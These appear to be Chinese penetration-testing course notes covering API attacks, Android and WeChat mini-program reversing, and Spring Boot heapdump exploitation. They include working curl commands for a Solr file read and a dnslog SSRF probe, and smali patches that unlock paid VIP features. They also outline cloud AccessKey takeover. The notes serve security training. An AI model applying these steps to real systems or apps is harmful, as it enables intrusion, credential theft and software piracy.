<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3、任意文件读取</span><br><span class="line">curl -i -s -k &#x27;http://192.168.233.128:8983/solr/demo/debug/dump?param=ContentStreams&amp;stream.url=file:///etc/passwd&#x27;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">为什么说也是ssrf漏洞，是因为用到了file协议去读取，这样也可以进行内网探针，比如把file协议进行修改为http协议。看支不支持http协议可以用dnslog来进行判断。</span><br><span class="line">curl -i -s -k &#x27;http://192.168.233.128:8983/solr/demo/debug/dump?param=ContentStreams&amp;stream.url=http://2e8m2t.dnslog.cn&#x27;</span><br><span class="line"> </span><br><span class="line">执行能接受到反弹，所以支持http协议。</span><br></pre></td></tr></table></figure>

<h1 id="第65天-API安全-接口安全-WebPack-REST-SOAP-WSDL-WebService"><a href="#第65天-API安全-接口安全-WebPack-REST-SOAP-WSDL-WebService" class="headerlink" title="第65天 API安全-接口安全&amp;WebPack&amp;REST&amp;SOAP&amp;WSDL&amp;WebService"></a>第65天 API安全-接口安全&amp;WebPack&amp;REST&amp;SOAP&amp;WSDL&amp;WebService</h1><h3 id="知识点-5"><a href="#知识点-5" class="headerlink" title="知识点"></a>知识点</h3><p>1.HTTP类接口-测评<br>2.RPC类接口-测评<br>3.Web Service类-测评<br>参考链接：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/e48db27d7c70">https://www.jianshu.com/p/e48db27d7c70</a></p>
<h4 id="内容点：-1"><a href="#内容点：-1" class="headerlink" title="内容点："></a>内容点：</h4><p>SOAP(Simple Object Access Protocol)简单对象访问协议是交换数据的一种协议规范，<br>是一种轻量的、简单的、基于XML（标准通用标记语言下的一个子集）的协议，它被设计<br>成在WEB上交换结构化的和固化的信息，SOAP不是Web Servicet的专有协议，<br>SOAP使用HTTP来发送XML格式的数据，可以简单理解为：SOAP&#x3D;HTTP+XML</p>
<p>REST(Representational State Transfer)即表述性状态传递，在三种主流的Web服务实<br>现方案中，因为REST模式的Wb服务与复杂的SOAP和XML-RPC对比来讲明显的更加简<br>洁，越来越多的Web服务开始采用REST风格设计和实现。例如，Amazon.com提供接近<br>REST风格的Web服务进行图书查找；雅虎提供的Web服务也是REST风格的。</p>
<p>WSDL(Web Services Description Language)即网络服务描述语言，用于描述Web服务<br>的公共接口。这是一个基于XML的关于如何与Wb服务通讯和使用的服务描述；也就是描<br>述与目录中列出的Wb服务进行交互时需要绑定的协议和信息格式。通常采用抽象语言描<br>述该服务支持的操作和信息，使用的时候再将实际的网络协议和信息格式绑定给该服务。</p>
<h4 id="接口数据包："><a href="#接口数据包：" class="headerlink" title="接口数据包："></a>接口数据包：</h4><p>Method:请求方法<br>攻击方式：OPTIONS,PUT,MOVE,DELETE<br>效果：上传恶意文件，修改页面等<br>URL:唯一资源定位符<br>攻击方式：猜测，遍历，跳转<br>效果：未授权访问等<br>Params:请求参数<br>攻击方式：构造参数，修改参数，遍历，重发<br>效果：爆破，越权，未授权访问，突破业务逻辑等<br>Authorization:认证方式<br>攻击方式：身份伪造，身份篡改<br>效果：越权，未授权访问等<br>Headers:清求消息头<br>攻击方式：拦截数据包，改Hosts,<br>改Referer,改Content-Type等<br>效果：绕过身份认证，绕过Referer验证，绕过类型验证，DDOS等<br>Body:消息体<br>攻击方式：SQL注入，XML注入，反序列化等<br>效果：提权，突破业务逻辑，未授权访问等</p>
<p>安全问题：<br>XSS跨站，信息泄露，暴力破解，文件上传，未授权访问，JWT授权认证，接口滥用等</p>
<p>演示案例：<br>WebService:类-Wsdl&amp;ReadyAP-SQL注入<br>SOAP类-Swagger&amp;SoapUla&amp;EXP-信息泄露<br>HTTP类-WebPack&amp;PackerFuzzer-信息泄露</p>
<p>WebService-Wsdl&amp;SoapUl<br>探针：?wsdl<br>利用：SoapUla&amp;ReadyAPI<br>思路：使用googlehack语法查找可能含有漏洞的资产 edu.cn inurl:asmx?wsdl<br>使用工具readyAPI进行扫描—扫描出存在sql注入–sqlmap一把梭</p>
<p>SOAP-Swagger&amp;SoapUl&amp;EXP<br>探针：目录&amp;S资源<br>利用：SoapUla&amp;EXP<br><a target="_blank" rel="noopener" href="https://github.com/lijiejie/swagger-exp">https://github.com/lijiejie/swagger-exp</a><br><a target="_blank" rel="noopener" href="https://github.com/jayus0821/swagger-hack">https://github.com/jayus0821/swagger-hack</a><br>目录:<br>&#x2F;swagger<br>&#x2F;api&#x2F;swagger<br>&#x2F;swagger&#x2F;ui<br>&#x2F;api&#x2F;swagger&#x2F;ui<br>&#x2F;swagger-ui.html<br>&#x2F;api&#x2F;swagger-ui.html<br>&#x2F;user&#x2F;swagger-ui.html<br>&#x2F;libs&#x2F;swaggerui<br>&#x2F;api&#x2F;swaggerui<br>&#x2F;swagger-resources&#x2F;configuration&#x2F;ui<br>&#x2F;swagger-resources&#x2F;configuration&#x2F;security<br>思路同上 使用swagger-hack.py脚本</p>
<p>#HTTP-Webpack&amp;PackerFuzzer<br>探针：插件&amp;JS资源<br>利用：PackerFuzzer<br><a target="_blank" rel="noopener" href="https://github.com/rtcatc/Packer-Fuzzer">https://github.com/rtcatc/Packer-Fuzzer</a></p>
<h1 id="第66天-API安全-接口安全-阿里云KEY-postman-DVWS-XEE-鉴权-泄露"><a href="#第66天-API安全-接口安全-阿里云KEY-postman-DVWS-XEE-鉴权-泄露" class="headerlink" title="第66天 API安全-接口安全&amp;阿里云KEY%postman&amp;DVWS&amp;XEE&amp;鉴权&amp;泄露"></a>第66天 API安全-接口安全&amp;阿里云KEY%postman&amp;DVWS&amp;XEE&amp;鉴权&amp;泄露</h1><p>知识点<br>1.HTTP类接口-测评<br>2.RPC类接口-测评<br>3.Web Service类-测评<br>参考链接：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/e48db27d7c70">https://www.jianshu.com/p/e48db27d7c70</a></p>
<p>内容点：<br>SOAP(Simple Object Access Protocol)简单对象访问协议是交换数据的一种协议规范，<br>是一种轻量的、简单的、基于XML（标准通用标记语言下的一个子集）的协议，它被设计<br>成在WEB上交换结构化的和固化的信息，SOAP不是Web Servicet的专有协议，<br>SOAP使用HTTP来发送XML格式的数据，可以简单理解为：SOAP&#x3D;HTTP+XML</p>
<p>REST(Representational State Transfer)即表述性状态传递，在三种主流的Web服务实<br>现方案中，因为REST模式的Wb服务与复杂的SOAP和XML-RPC对比来讲明显的更加简<br>洁，越来越多的Web服务开始采用REST风格设计和实现。例如，Amazon.com提供接近<br>REST风格的Web服务进行图书查找；雅虎提供的Web服务也是REST风格的。</p>
<p>WSDL(Web Services Description Language)即网络服务描述语言，用于描述Web服务<br>的公共接口。这是一个基于XML的关于如何与Wb服务通讯和使用的服务描述；也就是描<br>述与目录中列出的Wb服务进行交互时需要绑定的协议和信息格式。通常采用抽象语言描<br>述该服务支持的操作和信息，使用的时候再将实际的网络协议和信息格式绑定给该服务。</p>
<p>接口数据包：<br>Method:请求方法<br>攻击方式：OPTIONS,PUT,MOVE,DELETE<br>效果：上传恶意文件，修改页面等<br>URL:唯一资源定位符<br>攻击方式：猜测，遍历，跳转<br>效果：未授权访问等<br>Params:请求参数<br>攻击方式：构造参数，修改参数，遍历，重发<br>效果：爆破，越权，未授权访问，突破业务逻辑等<br>Authorization:认证方式<br>攻击方式：身份伪造，身份篡改<br>效果：越权，未授权访问等<br>Headers:清求消息头<br>攻击方式：拦截数据包，改Hosts,<br>改Referer,改Content-Type等<br>效果：绕过身份认证，绕过Referer验证，绕过类型验证，DDOS等<br>Body:消息体<br>攻击方式：SQL注入，XML注入，反序列化等<br>效果：提权，突破业务逻辑，未授权访问等</p>
<p>安全问题：<br>XSS跨站，信息泄露，暴力破解，文件上传，未授权访问，JWT授权认证，接口滥用等</p>
<p>演示案例：<br>工具使用-Postman自动化汉测试<br>安全问题-Dvws泄世漏&amp;鉴权&amp;XE<br>安全问题-阿里KEY信息泄漏利用<br>应用方向-违法APP打包接口分析</p>
<p>工具使用-Postman自动化测试<br><a target="_blank" rel="noopener" href="https://www.postman.com/downloads/">https://www.postman.com/downloads/</a></p>
<h4 id="安全问题-Dvws世是-鉴权-OXE"><a href="#安全问题-Dvws世是-鉴权-OXE" class="headerlink" title="安全问题-Dvws世是&amp;鉴权&amp;OXE"></a>安全问题-Dvws世是&amp;鉴权&amp;OXE</h4><p><a target="_blank" rel="noopener" href="https://github.com/snoopysecurity/dvws-node">https://github.com/snoopysecurity/dvws-node</a><br>1、注册时抓包可尝试修改admin为ture，看看能否绕过jwt验证<br>登录返回的数据包为admin，false</p>
<p>修改登录数据包为admin&#x3D;true</p>
<p>2、通过数据包中body的格式判断提交请求的格式为xml格式，尝试是否存在XXE漏洞，利用XXE可以实现读取文件、若误回显可以尝试外部实体注入或者使用dnslog检测漏洞存在<br>复现：在用户数据搜索出抓包，看到格式为xml格式，尝试使用xxe漏洞读取到文件</p>
<p>安全问题-阿里云KEY信息池漏利用<br><a target="_blank" rel="noopener" href="https://yun.cloudbility.com/">https://yun.cloudbility.com/</a><br><a target="_blank" rel="noopener" href="https://github.com/mrknow001/aliyun-accesskey-Tools">https://github.com/mrknow001/aliyun-accesskey-Tools</a><br>接口配置文件泄漏导致云资源生机受控<br>目前为止，云服务器已经占据了服务器的大部分市场，由于云服务器易管理，操作性强，安全程度高。很多大型厂商都选择将资产部署在云服务上，但安全的同时由于运维人员的疏忽也会导致一些非预期的突破口。当云产品Accesskey在调用过程中，出现泄漏会导致对象控制资源全部被控，影响严重！<br>1、常规获取Accesskey方式<br>-通过源码泄漏配置文件<br>-通过应用程序报错读取<br>-通过JS文件引用中获取<br>如图：页面报错</p>
<h5 id="应用方向违法APP打包接口分析"><a href="#应用方向违法APP打包接口分析" class="headerlink" title="应用方向违法APP打包接口分析"></a>应用方向违法APP打包接口分析</h5><p>完整的分析流程：burp抓包找到真实访问的域名地址—通过信息收集到含有使用webpack组件的网站<br>–使用&#x2F;Packer-Fuzzer工具扫描</p>
<h1 id="第67天-APP攻防-Frida反证书抓包-移动安全系统-资产提取-评估扫描"><a href="#第67天-APP攻防-Frida反证书抓包-移动安全系统-资产提取-评估扫描" class="headerlink" title="第67天 APP攻防-Frida反证书抓包&amp;移动安全系统&amp;资产提取&amp;评估扫描"></a>第67天 APP攻防-Frida反证书抓包&amp;移动安全系统&amp;资产提取&amp;评估扫描</h1><h4 id="知识点：-44"><a href="#知识点：-44" class="headerlink" title="知识点："></a>知识点：</h4><p>1、资产提权-AppinfoScanner<br>2、评估框架-MobSF&amp;mobexler<br>3、抓包利器-Frida&amp;rOcapture</p>
<h4 id="章节点："><a href="#章节点：" class="headerlink" title="章节点："></a>章节点：</h4><p>1、信息收集-应用&amp;资产提取&amp;权限等<br>2、漏洞发现反编译&amp;脱壳&amp;代码审计<br>3、安全评估-组件&amp;敏感密匙&amp;恶意分析</p>
<h4 id="核心点："><a href="#核心点：" class="headerlink" title="核心点："></a>核心点：</h4><p>0、内在点资产提取&amp;版本&amp;信息等<br>1、抓包点-反代理&amp;反证书&amp;协议等<br>2、逆向点-反编译&amp;脱壳&amp;重打包等<br>3、安全点资产&amp;接口8漏洞&amp;亩计等</p>
<h4 id="演示案例：-38"><a href="#演示案例：-38" class="headerlink" title="演示案例："></a>演示案例：</h4><p>内在-资产提取-AppinfoScanner<br>内在-安全评估-MobSF&amp;mobexler<br>外在-证书抓包-Frida-server&amp;rOcapture</p>
<h4 id="内在-资产提取-Appinfoscanner"><a href="#内在-资产提取-Appinfoscanner" class="headerlink" title="内在-资产提取-Appinfoscanner"></a>内在-资产提取-Appinfoscanner</h4><p>Appinfoscanner一款适用于以HW行动&#x2F;红队&#x2F;渗透测试团队为场景的移动端(Android、<br>iOS、WEB、H5、静态网站)信息收集扫描工具，可以帮助渗透测试工程师、攻击队成员、<br>红队成员快速收集到移动端或奢静态WEB站点中关键的资产信惠并提供基本的信息输出，<br>如：Title、Domain、CDN、撞纹信息、状态信息等.<br>httpslgithub.com&#x2F;kelvinBen&#x2F;AppinfoScanner</p>
<h4 id="内在-安全评估-MobsF-mobexler"><a href="#内在-安全评估-MobsF-mobexler" class="headerlink" title="内在-安全评估-MobsF&amp;mobexler"></a>内在-安全评估-MobsF&amp;mobexler</h4><p>移动安全框爆（MobsF）是一种自动化的一体化移动应用程序（AndroidiosWindows）渗<br>透测试、恶意软件分析和安全评估框案，能够执行静态和动态分析，MobSF支持移动应用<br>程序二进制文件（APK、XAPK、IPA和APPX）以及压缩源代码，并视供RESTAPI以与<br>您的CI&#x2F;CD或DevSecOps管道无缝集成。动态分析器可帮助您执行运行时安全评估和交<br>互式仪器浏试。<br>-Mobexler是基于ElementaryOs的定制虚拟机，盲在带助进行Android和iOs应用程序的渗<br>透测试。Mobexler预装了各种开源工具，脚本，黑密必备件等，这些部是安全测试<br>Androld和ios应用程序所必需的.<br>https:l&#x2F;mobexler.com&#x2F;<br>https:&#x2F;lgithub.com&#x2F;MobsF&#x2F;Mobile-Security-Framework-MobsF<br>dockerpullopensecurity&#x2F;mobile-secunity-framework-mobst<br>docker run -it -p 8008:8000 opensecurity&#x2F;mobile-security-framework-mobsf:latest</p>
<h4 id="外在-证书抓包-frida-server-rocapture"><a href="#外在-证书抓包-frida-server-rocapture" class="headerlink" title="外在-证书抓包-frida-server&amp;rocapture"></a>外在-证书抓包-frida-server&amp;rocapture</h4><p>-r0capture仅限安卓平台，测试安卓7、8、9、10、11 可用 ;<br>无视所有证书校验或绑定，不用考虑任何证书的事情；<br>通杀TCP&#x2F;P四层模型中的应用层中的全部协议；<br>通杀协议包括：Http,Websocket,Ftp,Xmpp,Imap,Smtp,Protobu等、及它们的ssL版本;<br>通杀所有应用层框架，包括HttpUrlConnection、Okhttp1&#x2F;3&#x2F;4、Retrofit&#x2F;Volley等等;<br>无视加固，不管是整体壳还是二代壳或VMP，不用考虑加固的事情;<br>-Firda 是一款易用的跨平 Hook 工具，Java 层到 Native 层的 Hook 无所不能，是一种 动<br>态的插桩工具，可以插入代码到原生App的内存空间中，动态的去监视和修改行为，原生<br>平台包括Win、Mac、Linux、Android、ios全平台。</p>
<p>测试环境：<br>Windows10Python3.7夜神模拟器rocapturefrida-serverwireshark<br><a target="_blank" rel="noopener" href="https://lgithub.com/roysue/rocapture">https://lgithub.com/roysue/rocapture</a><br><a target="_blank" rel="noopener" href="https://github.com/frida/frida/releases">https://github.com/frida/frida/releases</a></p>
<p>3、转发并启动Frida<br>adbforwardtcp:27042tcp:27042<br>连接判断: frida-ps-U frida-ps-R<br>4、获取包名并运行抓包<br>获取包名：Is&#x2F;data&#x2F;data或ApkMessenger<br>python rocapture.py-U -f包名-p xxxx.pcap</p>
<h1 id="第68天-APP攻防-Xposed-Frida-Hook-证书校验-反代理-代理转发"><a href="#第68天-APP攻防-Xposed-Frida-Hook-证书校验-反代理-代理转发" class="headerlink" title="第68天 APP攻防-Xposed&amp;Frida&amp;Hook&amp;证书校验&amp;反代理&amp;代理转发"></a>第68天 APP攻防-Xposed&amp;Frida&amp;Hook&amp;证书校验&amp;反代理&amp;代理转发</h1><h4 id="知识点：-45"><a href="#知识点：-45" class="headerlink" title="知识点："></a>知识点：</h4><p>1、APP防代理绕过-应用&amp;转发<br>2、APP证书校验类型-单向&amp;双向<br>3、APP证书校验绕过-Frida&amp;XP框架等</p>
<h4 id="章节点：-1"><a href="#章节点：-1" class="headerlink" title="章节点："></a>章节点：</h4><p>1、信息收集-应用&amp;资产提取&amp;权限等<br>2、漏洞发现-反编译&amp;脱壳&amp;代码审计<br>3、安全评估-组件&amp;敏感密匙&amp;恶意分析</p>
<h4 id="核心点：-1"><a href="#核心点：-1" class="headerlink" title="核心点："></a>核心点：</h4><p>0、内在点-资产提取&amp;版本&amp;信息等<br>1、抓包点-反代理&amp;反证书&amp;协议等<br>2、逆向点-反编译&amp;脱壳&amp;重打包等<br>3、安全点-资产&amp;接口&amp;漏洞&amp;审计等</p>
<h4 id="演示案例：-39"><a href="#演示案例：-39" class="headerlink" title="演示案例："></a>演示案例：</h4><p>某牛牛防抓包-xposed&amp;frida&amp;rOcapture<br>某社交防抓包-Proxifier&amp;frida&amp;rocapture</p>
<h4 id="反代理绕过："><a href="#反代理绕过：" class="headerlink" title="反代理绕过："></a>反代理绕过：</h4><p><a target="_blank" rel="noopener" href="https://zone.huoxian.cn/d/440-app">https://zone.huoxian.cn/d/440-app</a><br>1、自身的抓包应用<br>2、Proxifier转发使用<br>思路：<br>1、先使用模拟器中的代理软件检测app是否有防代理机制，若存在则考虑在宿主机上采用proxifier转发模拟器的数据包到burp绕过反代理的检测机制<br>2、若通过上述手段后app仍显示网路错误，但是burp中显示一两个数据包，则是验证了证书，若想要绕过证书可采用以下三种方法，安装xposed框架–安装绕过代理、绕过证书应用–开启proxifier代理转发</p>
<h4 id="证书校验绕过："><a href="#证书校验绕过：" class="headerlink" title="证书校验绕过："></a>证书校验绕过：</h4><p>情况1，客户端不存在证书校验，服务器也不存在证书校验，<br>情况2，客户端存在校验服务端证书，服务器也不存在证书校验，单项校验。<br>情况3、客户端存在证书校验，服务器也存在证书校验，双向校验。<br>1、Frida&amp;rocapture底层<br>2、Xposed&amp;JustTrust&amp;HOOK<br>3、反编译逆向提取证书重编打包</p>
<p>探探APP测试：1、先尝试模拟器代理转发数据到burp（显示网络连接异常）<br>2、尝试使用proxifier代理转发模拟器的数据包到burp（有数据包但是因为转发速度限制仍存在问题）<br>3、使用xposed尝试绕过反代理和证书</p>
<p>夜神模拟器和逍遥模拟器<br>有些应用存在反虚拟机功能，检测到为虚拟机时会打不开应用，夜神模拟器可以绕过反vm检测</p>
<h1 id="第69天-APP攻防-反编译-查壳脱壳-重打包签名-修改次数会员版权限制"><a href="#第69天-APP攻防-反编译-查壳脱壳-重打包签名-修改次数会员版权限制" class="headerlink" title="第69天 APP攻防-反编译&amp;查壳脱壳&amp;重打包签名&amp;修改次数会员版权限制"></a>第69天 APP攻防-反编译&amp;查壳脱壳&amp;重打包签名&amp;修改次数会员版权限制</h1><h4 id="知识点：-46"><a href="#知识点：-46" class="headerlink" title="知识点："></a>知识点：</h4><p>1、APP防代理绕过-应用&amp;转发<br>2、APP证书校验类型-单向&amp;双向<br>3、APP证书校验绕过-Frida&amp;XP框架等</p>
<h4 id="章节点：-2"><a href="#章节点：-2" class="headerlink" title="章节点："></a>章节点：</h4><p>1、信息收集-应用&amp;资产提取&amp;权限等<br>2、漏洞发现-反编译&amp;脱壳&amp;代码审计<br>3、安全评估-组件&amp;敏感密匙&amp;恶意分析</p>
<h4 id="核心点：-2"><a href="#核心点：-2" class="headerlink" title="核心点："></a>核心点：</h4><p>0、内在点-资产提取&amp;版本&amp;信息等<br>1、抓包点-反代理&amp;反证书&amp;协议等<br>2、逆向点-反编译&amp;脱壳&amp;重打包等<br>3、安全点-资产&amp;接口&amp;漏洞&amp;审计等</p>
<h4 id="演示案例：-40"><a href="#演示案例：-40" class="headerlink" title="演示案例："></a>演示案例：</h4><p>反编译加固-自动查壳脱壳<br>功能修改-反编译&amp;次数&amp;会员<br>功能修改-反编译&amp;图标&amp;信息<br>打包编译证书签名&amp;重打包等</p>
<p>反编译加固-自动查壳脱壳<br><a target="_blank" rel="noopener" href="https://github.com/CodingGay/BlackDex">https://github.com/CodingGay/BlackDex</a><br>查壳：ApkScan-PWD<br>脱壳：BlackDex</p>
<h4 id="功能修改-反编译-次数-会员"><a href="#功能修改-反编译-次数-会员" class="headerlink" title="#功能修改-反编译&amp;次数&amp;会员"></a>#功能修改-反编译&amp;次数&amp;会员</h4><p>贵妃APP实战：<br>思路：功能每日观看次数处尝试修改手机型号、IEMI值可绕过次数限制<br>修改get_is_svip为1，使得用户默认为svip<br>-次数：<br>逻辑：修改手机型号</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.method public getRe_today_view_times(Ljava/lang/String;</span><br><span class="line">	.locals 1</span><br><span class="line">	.line 307</span><br><span class="line">	iget-object vo,po,Lcom/ufozfnxzqm/dvbphwfo/entity/Userlnfo;-</span><br><span class="line">re_today_view_times:Ljava/lang/String;</span><br></pre></td></tr></table></figure>

<p>会员：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.method public getls_vip（）I</span><br><span class="line">	.locals 1</span><br><span class="line">	.line 347</span><br><span class="line">	.iget vo,p0,Lcom/ufozfnxzqm/dvbphwfo/entity/Userlnfo;-&gt;is vip:I</span><br><span class="line">	const/4 vo.0x</span><br><span class="line">	return vo</span><br><span class="line">.end method</span><br></pre></td></tr></table></figure>

<h4 id="功能修改-反编译-图标-信息"><a href="#功能修改-反编译-图标-信息" class="headerlink" title="功能修改-反编译&amp;图标&amp;信息"></a>功能修改-反编译&amp;图标&amp;信息</h4><p>使用安卓修改大师修改图标和信息，还可以修改app权限获取收集通讯录等</p>
<h1 id="第70天-APP攻防-微信小程序-解包反编译-数据抓包-APK信息资源提取"><a href="#第70天-APP攻防-微信小程序-解包反编译-数据抓包-APK信息资源提取" class="headerlink" title="第70天 APP攻防-微信小程序&amp;解包反编译&amp;数据抓包&amp;APK信息资源提取"></a>第70天 APP攻防-微信小程序&amp;解包反编译&amp;数据抓包&amp;APK信息资源提取</h1><h4 id="知识点：-47"><a href="#知识点：-47" class="headerlink" title="知识点："></a>知识点：</h4><p>1、APK信息资源提取<br>2、微信小程序致据抓包<br>3、做信小程序解包反编译</p>
<p>1、信息收集应用8资产提取&amp;权限等<br>2、漏润发现-反编泽&amp;脱壳&amp;代码审计<br>3、安全评估组件8散密匙&amp;思意分析</p>
<h4 id="核心点：-3"><a href="#核心点：-3" class="headerlink" title="核心点："></a>核心点：</h4><p>1、内在点资产提取&amp;版本&amp;信息等<br>2、抓包点-反代理8反证书8协议等<br>3、逆向点-反编译8脱壳8重打包等<br>4、安全点资产&amp;接口&amp;漏洞&amp;审计等</p>
<h3 id="演示案例：-41"><a href="#演示案例：-41" class="headerlink" title="演示案例："></a>演示案例：</h3><p>APP&amp;APK-信息资源文件提取<br>微信小程序-真机&amp;模拟器数据抓包<br>微信小程序-PC&amp;模拟器分包反编译</p>
<h4 id="APP-APK-信息资源文件提取"><a href="#APP-APK-信息资源文件提取" class="headerlink" title="APP&amp;APK-信息资源文件提取"></a>APP&amp;APK-信息资源文件提取</h4><p>APK Messenger–是本信愿&amp;资源文件&amp;开启权限等</p>
<h4 id="微信小程序真机-模拟器数据抓包"><a href="#微信小程序真机-模拟器数据抓包" class="headerlink" title="微信小程序真机&amp;模拟器数据抓包"></a>微信小程序真机&amp;模拟器数据抓包</h4><p>安卓系统抓包（微信小程序）：<br>1、安卓系统7.0以下版本，不管微信任意版本，都会信任系统提供的证书<br>2、安卓系统7.0以上版本，微信7.0以下版本，微信会信任系统提供的证书<br>3、安卓系统7.0以上版本，微信7.0以上版本，微信只信任它自己配置的证书列表<br>基于上述我们解决的方式如下：<br>1、将证书安装到系统证书中(需要r00t)<br>2、苹果手机（苹果手机不受此影响）<br>3、采用安卓系统低于7.0的横拟器<br>演示：逍遥模拟器5.1安卓系统微信小程序抓包<br>思路：模拟器代理转发到burp<br>演示：夜神模拟器多开5安卓系统微信小程序抓包<br>演示：真机IPhone-OS系统微信小程序抓包<br>条件：抓包本机需要和Iphone手机处于同一WIFI下<br>Iphonei配置wif的代理，代理设置地址写本地抓包的工具地址和端口</p>
<p>安全点：<br>渗透角度：测试的app提供服务的服务器，网站，接口等，一旦这个有安全问题，被不法<br>分子利用，相当于APP正常服务就会受到直接的影响！<br>APK-白盒-Java代码审计<br>APK-黑盒-资产&amp;WEB&amp;IP&amp;接口等<br>小程序-白盒-Node.JS代码审计<br>小程序黑盒资产&amp;WEB&amp;P&amp;接口等<br>开发角度：测试的app里代码的设计安全，采用没加密的发送数据，采用权限过高的设置<br>导致攻击者利用app获取到手机的敏感信息等。<br>弱加密，逻辑安全，授权，中间人等</p>
<h4 id="微信小程序-PC-模拟器分包反编译"><a href="#微信小程序-PC-模拟器分包反编译" class="headerlink" title="微信小程序-PC&amp;模拟器分包反编译"></a>微信小程序-PC&amp;模拟器分包反编译</h4><p>1、高富帅版：<br>欢迎使用多功能小程序助手工具，点击确定开始使用。<br>免责声明：不得将小程序反编泽源码程序和反编泽图片素材挪作商业或盈利用<br>使用教程地：https:<a target="_blank" rel="noopener" href="http://www.kancloud.cn/ludeqi/XCXZS/2607637">www.kancloud.cn/ludeqi/XCXZS/2607637</a><br>最新版下载地址：https:xcX.siqingw.top&#x2F;xcx.zip<br>2、穷屌丝版：<br><a target="_blank" rel="noopener" href="https://github.com/sanriqing/WxAppUnpacker">https://github.com/sanriqing/WxAppUnpacker</a><br>安装node.js<br><a target="_blank" rel="noopener" href="http://nodejs.cn/download/">http://nodejs.cn/download/</a><br>安装依赖：<br>npm install<br>模拟器取出wxapkg文件：<br>&#x2F;data&#x2F;data&#x2F;com.tencent.mm&#x2F;MicroMsg&#x2F;xxxxxx&#x2F;appbrand&#x2F;pkg<br>反编译解包<br>node wuWxapkg.js -s&#x3D;…&#x2F;xxxx.wxapkg</p>
<h1 id="第71天-APP攻防-实战拿下-Springboot未授权-HeapDump提取-OSS利用"><a href="#第71天-APP攻防-实战拿下-Springboot未授权-HeapDump提取-OSS利用" class="headerlink" title="第71天 APP攻防-实战拿下&amp;Springboot未授权&amp;HeapDump提取&amp;OSS利用"></a>第71天 APP攻防-实战拿下&amp;Springboot未授权&amp;HeapDump提取&amp;OSS利用</h1><h4 id="安全测试报告："><a href="#安全测试报告：" class="headerlink" title="安全测试报告："></a>安全测试报告：</h4><p>1、Spring Boot Actuator v.2未授权访问<br>2、Spring Boot RCE<br>3、HeapDump-信息泄漏-帐号密码等<br>select s from java.lang.String s<br>where &#x2F;pass&#x2F;.test(s.value.toString（）)</p>
<p>-HeapDump:分析：            ———-忽然想起来之前遇到渗透靶场里面也考了这个知识点，就是在泄露的信息中找的到flag。<br>JVisualVM MAT heapdump_tool等<br>JVisualVM:jdk自带<br>MAT:<a target="_blank" rel="noopener" href="https://www.eclipse.org/mat/downloads.php">https://www.eclipse.org/mat/downloads.php</a><br>heapdump_tool:<a target="_blank" rel="noopener" href="https://github.com/wyzxxz/heapdump_tool">https://github.com/wyzxxz/heapdump_tool</a><br>-Actuator未授权检测：<br><a target="_blank" rel="noopener" href="https://github.com/rabbitmask/SB-Actuator">https://github.com/rabbitmask/SB-Actuator</a><br>-SpringBooti漏洞利用：<br><a target="_blank" rel="noopener" href="https://github.com/LandGrey/SpringBootVulExploit">https://github.com/LandGrey/SpringBootVulExploit</a><br>-OSS_AccessKey利用：<br><a target="_blank" rel="noopener" href="https://github.com/mrknow001/aliyun-accesskey-Tools">https://github.com/mrknow001/aliyun-accesskey-Tools</a></p>
<h4 id="录像剪辑严重这里只简单说一下思路："><a href="#录像剪辑严重这里只简单说一下思路：" class="headerlink" title="录像剪辑严重这里只简单说一下思路："></a>录像剪辑严重这里只简单说一下思路：</h4><p>APP抓包信息收集出域名发现使用webpack所以packfuzz进行扫描，<br>再把域名放到awvs进行扫描<br>–发现actuator未授权访问漏洞（进行rce测试）<br>–下载heapdump下载后分析–翻出阿里云mysql账号密码<br>–因为只能本地访问所以连接失败–继续翻heapdump文件使用heapdump_tools翻出阿里云主机key<br>–获取到阿里云主机权限</p>
<h1 id="第72天-漏洞发现-Web框架中间件-联动-Goby-Afrog-Xray-Awvs-Vulmap"><a href="#第72天-漏洞发现-Web框架中间件-联动-Goby-Afrog-Xray-Awvs-Vulmap" class="headerlink" title="第72天 漏洞发现-Web框架中间件&amp;联动&amp;Goby&amp;Afrog&amp;Xray&amp;Awvs&amp;Vulmap"></a>第72天 漏洞发现-Web框架中间件&amp;联动&amp;Goby&amp;Afrog&amp;Xray&amp;Awvs&amp;Vulmap</h1><h4 id="知识点：-48"><a href="#知识点：-48" class="headerlink" title="知识点："></a>知识点：</h4><p>1、Bup简单介绍&amp;使用说明<br>2、Xray简单介绍&amp;使用说明<br>3、AWWS简单介绍&amp;使用说明<br>4、Goby简单介绍&amp;使用说明<br>5、Afrog简单介绍&amp;使用说明<br>6、ulmap简单介绍&amp;使用说明<br>7、Pocassist简单介绍&amp;使用说明<br>8、掌握工具安装使用&amp;原理&amp;联动&amp;适用<br>市面上有很多漏扫系统工具脚本，课程讲到的基本都是目前主流推荐的优秀项目！<br>具体项目：Burpsuite,Awvs,Xray,Goby,Afrog,Vulmap,Pocassist,Nessus,<br>Nuclei,Pentestkit,Kunyu,BP播件(HaE,ShiroScan.FastJsonScan,Log4j2Scan等)等。</p>
<h4 id="章节点：-3"><a href="#章节点：-3" class="headerlink" title="章节点："></a>章节点：</h4><p>1、漏洞发现-Web&amp;框架层面<br>2、漏洞发现-服务&amp;中间件层面<br>2、漏洞发现-APP&amp;小程序层面<br>3、漏洞发现-PC操作系统层面</p>
<p>Acunetix-一款商业的Web漏洞扫描程序，它可以检查Web应用程序中的漏洞，如SQL注 入、跨站脚本攻击、身份验证页上的弱口令长度等。它拥有一个操作方便的图形用户界 面，并且能够创建专业级的Wb站点安全审核报告。新版本集成了漏洞管理功能来扩展企 业全面管理、优先级和控制漏洞威胁的能力。</p>
